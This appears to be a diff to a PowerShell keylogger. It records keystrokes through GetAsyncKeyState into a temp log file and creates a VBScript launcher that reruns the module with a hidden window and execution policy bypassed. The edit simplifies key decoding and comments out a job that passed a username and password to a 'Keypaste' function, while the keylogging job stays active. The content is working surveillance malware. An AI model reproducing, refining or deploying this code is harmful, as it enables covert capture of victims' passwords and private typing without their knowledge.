@@ -33,50 +33,51 @@ function script:Keylogger
             $logged = $getKeyState::GetAsyncKeyState($vkey) 
             if ($logged -eq -32767) 
             { 
-                if(($vkey -ge 48) -and ($vkey -le 57)) 
-                { 
-                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
-                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
-                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
-                        { 
-                            $result = "S-" + $vkey 
-                        } 
-                        else 
-                        { 
-                            $result = $vkey 
-                        } 
-                    } 
-                elseif(($vkey -ge 64) -and ($vkey -le 90)) 
-                { 
-                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
-                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
-                    $caps_state = [console]::CapsLock 
-                    if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
-                    { 
-                        $result = "S-" + $vkey 
-                    } 
-                    else 
-                    { 
-                        $result = $vkey 
-                    } 
-                } 
-                elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
-                { 
-                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
-                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
-                    if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
-                    { 
-                        $result = "S-" + $vkey
-                    } 
-                    else 
-                    { 
-                      $result = $vkey
-                    } 
-                } 
-                else 
-                { 
-                    $result = $vkey 
-                }
+                # if(($vkey -ge 48) -and ($vkey -le 57)) 
+                # { 
+                    # $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
+                    # $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
+                        # if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
+                        # { 
+                            # $result = "S-" + $vkey 
+                        # } 
+                        # else 
+                        # { 
+                            # $result = $vkey 
+                        # } 
+                    # } 
+                # elseif(($vkey -ge 64) -and ($vkey -le 90)) 
+                # { 
+                    # $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
+                    # $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
+                    # $caps_state = [console]::CapsLock 
+                    # if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
+                    # { 
+                        # $result = "S-" + $vkey 
+                    # } 
+                    # else 
+                    # { 
+                        # $result = $vkey 
+                    # } 
+                # } 
+                # elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
+                # { 
+                    # $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
+                    # $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
+                    # if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
+                    # { 
+                        # $result = "S-" + $vkey
+                    # } 
+                    # else 
+                    # { 
+                      # $result = $vkey
+                    # } 
+                # } 
+                # else 
+                # { 
+                    # $result = $vkey 
+                # }
+				$result = [char]$vkey
                 $now = Get-Date; 
                 $logLine = "$result " 
                 $filename = "$env:temp\key.log" 
@@ -281,6 +282,6 @@ function script:Keylogger
 	echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
 	echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
 
-	start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
+	# start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
 	start-job -InitializationScript $functions -scriptblock {Keylogger}
 
